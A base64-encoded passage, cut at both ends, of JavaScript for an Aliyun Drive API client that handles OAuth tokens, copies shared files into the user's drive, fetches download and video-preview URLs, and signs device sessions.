pLFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgaWYgKCFqc29uKSB7XFxcXG4gICAgICAgICAgICBqc29uID0gcG9zdCgnaHR0cHM6Ly9hcGktY2Yubm4uY2kvYWxpc3QvYWxpX29wZW4vY29kZScsIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiBoZWFkZXJzLFxcXFxuICAgICAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KGJvZHkpLFxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKGpzb24uaW5jbHVkZXMoJ1RvbyBNYW55IFJlcXVlc3RzJykgfHwganNvbi5pbmNsdWRlcyhcXFxcXFxcIjUwMiBCYWQgR2F0ZXdheVxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6aKR57mB6K+35rGC5pqC5pe26KKr5bCB56aBXFxcXFxcXFxuXFxcXFxcXCIgKyBqc29uKTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIGxldCBvcGVuUmVzdWx0ID0gSlNPTi5wYXJzZShqc29uKTtcXFxcbiAgICAgICAgICAgIGlmIChvcGVuUmVzdWx0LnJlZnJlc2hfdG9rZW4pIHtcXFxcbiAgICAgICAgICAgICAgICB0aGlzLm9wZW5Ub2tlbnMuUmVmcmVzaFRva2VuT3BlbiA9IG9wZW5SZXN1bHQucmVmcmVzaF90b2tlbjtcXFxcbiAgICAgICAgICAgICAgICB0aGlzLm9wZW5Ub2tlbnMuQWNjZXNzVG9rZW5PcGVuID0gb3BlblJlc3VsdC50b2tlbl90eXBlICsgXFxcXFxcXCIgXFxcXFxcXCIgKyBvcGVuUmVzdWx0LmFjY2Vzc190b2tlbjtcXFxcbiAgICAgICAgICAgICAgICB0aGlzLm9wZW5Ub2tlbnMuQmluZFJlZnJlc2hUb2tlbiA9IHRoaXMuYWxpVG9rZW5zLnJlZnJlc2hfdG9rZW47XFxcXG4gICAgICAgICAgICAgICAgdGhpcy5yZWZyZXNoT3BlbkNhbGxCYWNrKG9wZW5SZXN1bHQsIHRoaXMpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLm9wZW5Ub2tlbnM7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKCFjb2RlKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gdGhpcy53YWl0U2xlZXAoNTApLmNhY2hlT3BlblRva2VuKCk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwib3BlblRva2Vu6I635Y+W5aSx6LSlXFxcXFxcXFxuXFxcXFxcXCIgKyBqc29uKTtcXFxcbiAgICB9LFxcXFxuICAgIGNhY2hlT3BlblRva2VuKCkge1xcXFxuICAgICAgICBsZXQgcmVzdWx0ID0gcG9zdEFwaSgnaHR0cHM6Ly9vcGVuLmFsaXl1bmRyaXZlLmNvbS9vYXV0aC91c2Vycy9hdXRob3JpemU/Y2xpZW50X2lkPScgKyAnNzY5MTdjY2NjZDQ0NDFjMzk0NTdhMDRmNjA4NGZiMmYnICsgJyZyZWRpcmVjdF91cmk9aHR0cHM6Ly9hbGlzdC5ubi5jaS90b29sL2FsaXl1bmRyaXZlL2NhbGxiYWNrJnNjb3BlPXVzZXI6YmFzZSxmaWxlOmFsbDpyZWFkLGZpbGU6YWxsOndyaXRlJnN0YXRlPScsIHtcXFxcbiAgICAgICAgICAgIFxcXFxcXFwiYXV0aG9yaXplXFxcXFxcXCI6IDEsXFxcXG4gICAgICAgICAgICBcXFxcXFxcInNjb3BlXFxcXFxcXCI6IFxcXFxcXFwidXNlcjpiYXNlLGZpbGU6YWxsOnJlYWQsZmlsZTphbGw6d3JpdGVcXFxcXFxcIlxcXFxuICAgICAgICB9LCB7XFxcXG4gICAgICAgICAgICAnVXNlci1BZ2VudCc6IFBDX1VBLFxcXFxuICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tLycsXFxcXG4gICAgICAgICAgICAnYXV0aG9yaXphdGlvbic6IHRoaXMucmVhY2Nlc3NUaywgLy9nZXRBY2Nlc3NUb2tlblxcXFxuICAgICAgICAgICAgJ3gtY2FuYXJ5JzogJ2NsaWVudD13ZWIsYXBwPXNoYXJlLHZlcnNpb249djIuMy4xJyxcXFxcbiAgICAgICAgICAgICd4LXNoYXJlLXRva2VuJzogdGhpcy5zaGFyZVRva2VuXFxcXG4gICAgICAgIH0sIChlKSA9PiB7XFxcXG4gICAgICAgICAgICB0aGlzLnRyeVNvbHZlKGUpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICdhdXRob3JpemF0aW9uJzogdGhpcy5yZWFjY2Vzc1RrLFxcXFxuICAgICAgICAgICAgICAgICAgICAneC1zaGFyZS10b2tlbic6IHRoaXMuc2hhcmVUb2tlblxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGxldCBjb2RlID0gcmVzdWx0LnJlZGlyZWN0VXJpLnNwbGl0KFxcXFxcXFwiY29kZT1cXFxcXFxcIilbMV07XFxcXG4gICAgICAgIHJldHVybiB0aGlzLl9nZXRPcGVuVG9rZW4oY29kZSk7XFxcXG4gICAgfSxcXFxcbiAgICByZWZyZXNoT3BlblRva2VuKCkge1xcXFxuICAgICAgICBpZiAodGhpcy5vcGVuVG9rZW5zLlJlZnJlc2hUb2tlbk9wZW4gJiYgdGhpcy5vcGVuVG9rZW5zLkJpbmRSZWZyZXNoVG9rZW4gPT09IHRoaXMuYWxpVG9rZW5zLnJlZnJlc2hfdG9rZW4pIHtcXFxcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9nZXRPcGVuVG9rZW4oKTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiB0aGlzLmNhY2hlT3BlblRva2VuKCk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIF9jbG91ZEZpbGVPcGVyYXRlKGJvZHksIGNsb3VkRmlsZUlkLCBvcGVyYXRlVXJsKSB7XFxcXG4gICAgICAgIGxldCByZXN1bHQgPSBwb3N0QXBpKCdodHRwczovL2FwaS5hbGl5dW5kcml2ZS5jb20vYWRyaXZlL3YyL2JhdGNoJywge1xcXFxuICAgICAgICAgICAgXFxcXFxcXCJyZXF1ZXN0c1xcXFxcXFwiOiBbe1xcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwiYm9keVxcXFxcXFwiOiBib2R5LFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwiaGVhZGVyc1xcXFxcXFwiOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiQ29udGVudC1UeXBlXFxcXFxcXCI6IFxcXFxcXFwiYXBwbGljYXRpb24vanNvblxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcImlkXFxcXFxcXCI6IGNsb3VkRmlsZUlkIHx8IFxcXFxcXFwiMFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwibWV0aG9kXFxcXFxcXCI6IFxcXFxcXFwiUE9TVFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwidXJsXFxcXFxcXCI6IG9wZXJhdGVVcmxcXFxcbiAgICAgICAgICAgIH1dLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJyZXNvdXJjZVxcXFxcXFwiOiBcXFxcXFxcImZpbGVcXFxcXFxcIlxcXFxuICAgICAgICB9LCB7XFxcXG4gICAgICAgICAgICAnVXNlci1BZ2VudCc6IFBDX1VBLFxcXFxuICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tLycsXFxcXG4gICAgICAgICAgICAnYXV0aG9yaXphdGlvbic6IHRoaXMucmVhY2Nlc3NUayxcXFxcbiAgICAgICAgICAgIC8vZ2V0QWNjZXNzVG9rZW5cXFxcbiAgICAgICAgICAgICd4LWNhbmFyeSc6ICdjbGllbnQ9d2ViLGFwcD1zaGFyZSx2ZXJzaW9uPXYyLjMuMScsXFxcXG4gICAgICAgICAgICAneC1zaGFyZS10b2tlbic6IHRoaXMuc2hhcmVUb2tlblxcXFxuXFxcXG4gICAgICAgIH0sIChlLCByLCBiKSA9PiB7XFxcXG4gICAgICAgICAgICBpZiAoZS5jb2RlID09PSBcXFxcXFxcIlF1b3RhRXhoYXVzdGVkLkRyaXZlXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICB0aHJvdyBlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgaWYoIXRoaXMudHJ5U29sdmUoZSkpe1xcXFxuICAgICAgICAgICAgICAgIHRoaXMud2FpdFNsZWVwKDIwKS5yZWZyZXNoQWNjZXNzVG9rZW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbGV0IGJvZHkgPSBiLnJlcXVlc3RzWzBdLmJvZHk7XFxcXG4gICAgICAgICAgICBpZiAoYm9keS5kcml2ZV9pZCkge1xcXFxuICAgICAgICAgICAgICAgIGJvZHkuZHJpdmVfaWQgPSB0aGlzLmRlZkRyaXZlSWRcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGlmIChib2R5LnRvX2RyaXZlX2lkKSB7XFxcXG4gICAgICAgICAgICAgICAgYm9keS50b19kcml2ZV9pZCA9IHRoaXMuZGVmRHJpdmVJZFxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICBib2R5OiBiLFxcXFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0aGlzLnJlYWNjZXNzVGssXFxcXG4gICAgICAgICAgICAgICAgICAgICd4LXNoYXJlLXRva2VuJzogdGhpcy5zaGFyZVRva2VuXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIHJldHVybiByZXN1bHQ7XFxcXG4gICAgfSxcXFxcbiAgICBjb3B5RmlsZVRvQ2xvdWRGaWxlKGZpbGVJZCwgcmV0cnkpIHtcXFxcbiAgICAgICAgbGV0IHJlc3VsdCA9IHRoaXMuX2Nsb3VkRmlsZU9wZXJhdGUoe1xcXFxuICAgICAgICAgICAgXFxcXFxcXCJmaWxlX2lkXFxcXFxcXCI6IGZpbGVJZCxcXFxcbiAgICAgICAgICAgIFxcXFxcXFwic2hhcmVfaWRcXFxcXFxcIjogdGhpcy5zaGFyZUlkLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJhdXRvX3JlbmFtZVxcXFxcXFwiOiB0cnVlLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJ0b19wYXJlbnRfZmlsZV9pZFxcXFxcXFwiOiBcXFxcXFxcInJvb3RcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIFxcXFxcXFwidG9fZHJpdmVfaWRcXFxcXFxcIjogdGhpcy5kZWZEcml2ZUlkXFxcXG4gICAgICAgIH0sIFxcXFxcXFwiMFxcXFxcXFwiLCBcXFxcXFxcIi9maWxlL2NvcHlcXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCBib2R5ID0gcmVzdWx0ICYmIHJlc3VsdC5yZXNwb25zZXMgJiYgcmVzdWx0LnJlc3BvbnNlc1swXSAmJiByZXN1bHQucmVzcG9uc2VzWzBdLmJvZHkgfHwge307XFxcXG4gICAgICAgIGlmICghYm9keS5maWxlX2lkICYmICFyZXRyeSkge1xcXFxuICAgICAgICAgICAgdGhpcy53YWl0U2xlZXAoMjApLmdldFNoYXJlVG9rZW4oKTtcXFxcbiAgICAgICAgICAgIHRoaXMud2FpdFNsZWVwKDIwKS5yZWZyZXNoQWNjZXNzVG9rZW4oKTtcXFxcbiAgICAgICAgICAgIHJldHVybiB0aGlzLndhaXRTbGVlcCgyMCkuY29weUZpbGVUb0Nsb3VkRmlsZShmaWxlSWQsIHRydWUpO1xcXFxuICAgICAgICB9IGVsc2UgaWYgKCFib2R5LmZpbGVfaWQpIHtcXFxcbiAgICAgICAgICAgIGxldCBlID0gbmV3IEVycm9yKFxcXFxcXFwi5paH5Lu25aSN5Yi25aSx6LSlOlxcXFxcXFxcblxcXFxcXFwiICsgSlNPTi5zdHJpbmdpZnkocmVzdWx0KSk7XFxcXG4gICAgICAgICAgICBlLmNvZGUgPSBib2R5LmNvZGU7XFxcXG4gICAgICAgICAgICB0aHJvdyBlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiByZXN1bHQucmVzcG9uc2VzWzBdLmJvZHkuZmlsZV9pZDtcXFxcbiAgICB9LFxcXFxuICAgIG9wZW5DbG91ZEZpbGVUb0Rvd25VcmwoY2xvdWRGaWxlSWQpIHtcXFxcbiAgICAgICAgbGV0IGZpbGVJbmZvID0gcG9zdEFwaSgnaHR0cHM6Ly9vcGVuLmFsaXl1bmRyaXZlLmNvbS9hZHJpdmUvdjEuMC9vcGVuRmlsZS9nZXREb3dubG9hZFVybCcsIHtcXFxcbiAgICAgICAgICAgICdmaWxlX2lkJzogY2xvdWRGaWxlSWQsXFxcXG4gICAgICAgICAgICAnZHJpdmVfaWQnOiB0aGlzLmRlZkRyaXZlSWRcXFxcbiAgICAgICAgfSwge1xcXFxuICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBQQ19VQSxcXFxcbiAgICAgICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS8nLFxcXFxuICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0aGlzLm9wZW5Ub2tlbnMuQWNjZXNzVG9rZW5PcGVuXFxcXG4gICAgICAgIH0sICgpID0+IHtcXFxcbiAgICAgICAgICAgIHRoaXMud2FpdFNsZWVwKDMwKS5yZWZyZXNoT3BlblRva2VuKCk7XFxcXG4gICAgICAgICAgICByZXR1cm4ge1xcXFxuICAgICAgICAgICAgICAgIGJvZHk6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgJ2RyaXZlX2lkJzogdGhpcy5kZWZEcml2ZUlkLFxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICAnYXV0aG9yaXphdGlvbic6IHRoaXMub3BlblRva2Vucy5BY2Nlc3NUb2tlbk9wZW5cXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9O1xcXFxuICAgICAgICB9LCAyKTtcXFxcbiAgICAgICAgaWYgKCFmaWxlSW5mby51cmwgfHwgZmlsZUluZm8uY29kZSkgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi5LiL6L296ZO+5o6l6I635Y+W5aSx6LSlXFxcXFxcXFxuXFxcXFxcXCIgKyBmaWxlSW5mby5jb2RlICsgXFxcXFxcXCI6XFxcXFxcXCIgKyBmaWxlSW5mby5tZXNzYWdlKTtcXFxcbiAgICAgICAgcmV0dXJuIGZpbGVJbmZvLnVybDtcXFxcbiAgICB9LFxcXFxuICAgIGRlbGV0ZWVDbG91ZEZpbGUoY2xvdWRGaWxlSWQpIHtcXFxcbiAgICAgICAgbGV0IHJlc3VsdCA9IHRoaXMuX2Nsb3VkRmlsZU9wZXJhdGUoe1xcXFxuICAgICAgICAgICAgXFxcXFxcXCJkcml2ZV9pZFxcXFxcXFwiOiB0aGlzLmRlZkRyaXZlSWQsXFxcXG4gICAgICAgICAgICBcXFxcXFxcImZpbGVfaWRcXFxcXFxcIjogY2xvdWRGaWxlSWRcXFxcbiAgICAgICAgfSwgY2xvdWRGaWxlSWQsIFxcXFxcXFwiL2ZpbGUvZGVsZXRlXFxcXFxcXCIpO1xcXFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcXFxuICAgIH0sXFxcXG4gICAgZ2V0VmlkZW9UZW1QbGF5VXJsKGZpbGVJZCkge1xcXFxuICAgICAgICBsZXQgY2xvdWRGaWxlSWQgPSB0aGlzLmNvcHlGaWxlVG9DbG91ZEZpbGUoZmlsZUlkKTtcXFxcbiAgICAgICAgdGhpcy53YWl0U2xlZXAoMjApO1xcXFxuICAgICAgICBsZXQgcGxheVVybCA9IHRoaXMub3BlbkNsb3VkRmlsZVRvRG93blVybChjbG91ZEZpbGVJZCk7XFxcXG4gICAgICAgIHRoaXMud2FpdFNsZWVwKDUwKTtcXFxcbiAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgIHRoaXMuZGVsZXRlZUNsb3VkRmlsZShjbG91ZEZpbGVJZCk7XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGxvZyhcXFxcXFxcIiPmlofku7bliKDpmaTlpLHotKUjXFxcXFxcXFxu6ZSZ6K+v5L+h5oGvPlxcXFxcXFwiICsgZS50b1N0cmluZygpICsgXFxcXFxcXCJcXFxcXFxcXG7plJnor6/ooYw+XFxcXFxcXCIgKyBlLmxpbmVOdW1iZXIpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBwbGF5VXJsO1xcXFxuICAgIH0sXFxcXG4gICAgZ2V0RmlsZVRvRG93blVybChmaWxlSWQpIHtcXFxcbiAgICAgICAgbGV0IGRvd25sb2FkSW5mbyA9IHBvc3RBcGkoXFxcXFxcXCIvdjIvZmlsZS9nZXRfc2hhcmVfbGlua19kb3dubG9hZF91cmxcXFxcXFxcIiwge1xcXFxuICAgICAgICAgICAgXFxcXFxcXCJleHBpcmVfc2VjXFxcXFxcXCI6IDYwMCxcXFxcbiAgICAgICAgICAgIFxcXFxcXFwiZmlsZV9pZFxcXFxcXFwiOiBmaWxlSWQsXFxcXG4gICAgICAgICAgICBcXFxcXFxcInNoYXJlX2lkXFxcXFxcXCI6IHRoaXMuc2hhcmVJZFxcXFxuICAgICAgICB9LCB7XFxcXG4gICAgICAgICAgICBcXFxcXFxcIlgtU2hhcmUtVG9rZW5cXFxcXFxcIjogdGhpcy5zaGFyZVRva2VuLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJhdXRob3JpemF0aW9uXFxcXFxcXCI6IHRoaXMuYWxpVG9rZW5zLmFjY2Vzc190b2tlblxcXFxuICAgICAgICB9LCAoZSkgPT4ge1xcXFxuICAgICAgICAgICAgdGhpcy50cnlTb2x2ZShlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlgtU2hhcmUtVG9rZW5cXFxcXFxcIjogdGhpcy5zaGFyZVRva2VuLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcImF1dGhvcml6YXRpb25cXFxcXFxcIjogdGhpcy5hbGlUb2tlbnMuYWNjZXNzX3Rva2VuXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIHJldHVybiBkb3dubG9hZEluZm8uZG93bmxvYWRfdXJsO1xcXFxuICAgIH0sXFxcXG4gICAgZ2V0U2lnbigpIHtcXFxcbiAgICAgICAgaWYgKCF0aGlzLmFsaVRva2Vucy5kZXZpY2VfaWQpIHtcXFxcbiAgICAgICAgICAgIHRoaXMud2FpdFNsZWVwKDIwKS5yZWZyZXNoQWNjZXNzVG9rZW4oKTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgY2FsY3VsYXRlTmV3U2lnbiA9ICgpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBzaWduID0ganVzdFRlc3RTaWduKFxcXFxcXFwiNWRkZTRlMWJkZjllNDk2NmIzODdiYTU4ZjRiM2ZkYzNcXFxcXFxcIiwgdGhpcy5hbGlUb2tlbnMuZGV2aWNlX2lkLCB0aGlzLmFsaVRva2Vucy51c2VyX2lkKS5zcGxpdChcXFxcXFxcIiMjXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICBzaWduYXR1cmU6IHNpZ24uYXQoMCksXFxcXG4gICAgICAgICAgICAgICAgcHViS2V5OiBzaWduLmF0KC0xKVxcXFxuICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgfTtcXFxcbiAgICAgICAgbGV0IG5ld1NpZ24gPSBjYWxjdWxhdGVOZXdTaWduKCk7XFxcXG4gICAgICAgIGxldCByZXN1bHQgPSBwb3N0QXBpKCcvdXNlcnMvdjEvdXNlcnMvZGV2aWNlL2NyZWF0ZV9zZXNzaW9uJywge1xcXFxuICAgICAgICAgICAgXFxcXFxcXCJkZXZpY2VOYW1lXFxcXFxcXCI6IFxcXFxcXFwiRWRnZea1j+iniOWZqFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJtb2RlbE5hbWVcXFxcXFxcIjogXFxcXFxcXCJXaW5kb3dz572R6aG154mIXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBcXFxcXFxcInB1YktleVxcXFxcXFwiOiBuZXdTaWduLnB1YktleSxcXFxcbiAgICAgICAgfSwge1xcXFxuICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBQQ19VQSxcXFxcbiAgICAgICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbScsXFxcXG4gICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IHRoaXMucmVhY2Nlc3NUayxcXFxcbiAgICAgICAgICAgICdYLVNoYXJlLVRva2VuJzogdGhpcy5zaGFyZVRva2VuLFxcXFxuICAgICAgICAgICAgJ3gtZGV2aWNlLWlkJzogdGhpcy5hbGlUb2tlbnMuZGV2aWNlX2lkLFxcXFxuICAgICAgICAgICAgJ3gtc2lnbmF0dXJlJzogbmV3U2lnbi5zaWduYXR1cmVcXFxcbiAgICAgICAgfSwgKGUpID0+IHtcXFxcbiAgICAgICAgICAgIGlmIChlLm1lc3NhZ2UgPT09IFxcXFxcXFwieC1kZXZpY2UtaWQgZW1wdHlcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIHRoaXMud2FpdFNsZWVwKDIwKS5yZWZyZXNoQWNjZXNzVG9rZW4oKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHRoaXMudHJ5U29sdmUoZSk7XFxcXG4gICAgICAgICAgICB0aGlzLndhaXRTbGVlcCg1MCk7XFxcXG4gICAgICAgICAgICBuZXdTaWduID0gY2FsY3VsYXRlTmV3U2lnbigpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICBib2R5OiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwicHViS2V5XFxcXFxcXCI6IG5ld1NpZ24ucHViS2V5XFxcXG4gICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICdBdXRob3JpemF0aW9uJzogdGhpcy5yZWFjY2Vzc1RrLFxcXFxuICAgICAgICAgICAgICAgICAgICAnWC1TaGFyZS1Ub2tlbic6IHRoaXMuc2hhcmVUb2tlbixcXFxcbiAgICAgICAgICAgICAgICAgICAgJ3gtZGV2aWNlLWlkJzogdGhpcy5hbGlUb2tlbnMuZGV2aWNlX2lkLFxcXFxuICAgICAgICAgICAgICAgICAgICAneC1zaWduYXR1cmUnOiBuZXdTaWduLnNpZ25hdHVyZVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSwgMyk7XFxcXG4gICAgICAgIGlmIChyZXN1bHQuc3VjY2Vzcykge1xcXFxuICAgICAgICAgICAgcmV0dXJuIG5ld1NpZ247XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCJTaWdu6I635Y+W5aSx6LSl77yM6K+36YeN6K+V44CCXFxcXFxcXFxuY29kZTpcXFxcXFxcIiArIChyZXN1bHQuY29kZSB8fCBcXFxcXFxcIlxcXFxcXFwiKSArIFxcXFxcXFwiXFxcXFxcXFxubWVzc2FnZTpcXFxcXFxcIiArIChyZXN1bHQubWVzc2FnZSB8fCBcXFxcXFxcIlxcXFxcXFwiKSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIGdldFNoYXJlVmlkZW9QcmV2aWV3KGZpbGVJZCkge1xcXFxuICAgICAgICBsZXQgc2lnbiA9IHRoaXMuZ2V0U2lnbigpO1xcXFxuICAgICAgICBsZXQganNvbiA9IEpTT04ucGFyc2UocmVxdWVzdCgnaHR0cHM6Ly9hcGkuYWxpeXVuZHJpdmUuY29tL3YyL2ZpbGUvZ2V0X3NoYXJlX2xpbmtfdmlkZW9fcHJldmlld19wbGF5X2luZm8nLCB7XFxcXG4gICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uO2NoYXJzZXQ9VVRGLTgnLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwib3JpZ2luXFxcXFxcXCI6IFxcXFxcXFwiaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgXFxcXFxcXCJyZWZlcmVyXFxcXFxcXCI6IFxcXFxcXFwiaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwidXNlci1hZ2VudFxcXFxcXFwiOiBcXFxcXFxcIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTAuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTEwLjAuMTU4Ny40MVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwieC1jYW5hcnlcXFxcXFxcIjogXFxcXFxcXCJjbGllbnQ9d2ViLGFwcD1hZHJpdmUsdmVyc2lvbj12My4xLjBcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcIngtc2hhcmUtdG9rZW5cXFxcXFxcIjogdGhpcy5zaGFyZVRva2VuLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwiZmlsZWlkXFxcXFxcXCI6IHRoaXMuYWxpVG9rZW5zLnVzZXJfaWQsXFxcXG4gICAgICAgICAgICAgICAgJ0F1dGhvcml6YXRpb24nOiB0aGlzLnJlYWNjZXNzVGssXFxcXG4gICAgICAgICAgICAgICAgJ3gtZGV2aWNlLWlkJzogdGhpcy5hbGlUb2tlbnMuZGV2aWNlX2lkLFxcXFxuICAgICAgICAgICAgICAgICd4LXNpZ25hdHVyZSc6IHNpZ24uc2lnbmF0dXJlXFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgYm9keToge1xcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwiY2F0ZWdvcnlcXFxcXFxcIjogXFxcXFxcXCJsaXZlX3RyYW5zY29kaW5nXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgXFxcXFxcXCJmaWxlX2lkXFxcXFxcXCI6IGZpbGVJZCxcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcImdldF9wcmV2aWV3X3VybFxcXFxcXFwiOiB0cnVlLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwic2hhcmVfaWRcXFxcXFxcIjogdGhpcy5zaGFyZUlkLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwidGVtcGxhdGVfaWRcXFxcXFxcIjogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcImdldF9zdWJ0aXRsZV9pbmZvXFxcXFxcXCI6IHRydWVcXFxcbiAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcXFxcbiAgICAgICAgICAgIHRpbWVvdXQ6IDMwMDBcXFxcbiAgICAgICAgfSkpO1xcXFxuICAgICAgICByZXR1cm4ganNvbi52aWRlb19wcmV2aWV3X3BsYXlfaW5mby5saXZlX3RyYW5zY29kaW5nX3Rhc2tfbGlzdC5yZXZlcnNlKCk7XFxcXG4gICAgfVxcXFxufSk7XFxcXG5cXFxcbkFsaUFjY2Vzc0FwaS5jcmVhdGVEZWZhdWx0ID0gZnVuY3Rpb24oc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGFsaVRva2VuLCBvcGVuVG9rZW4sIE1ZX1RJVExFKSB7XFxcXG4gICAgY29uc3Qge1xcXFxuICAgICAgICBvcGVuVG9rZW5zRmls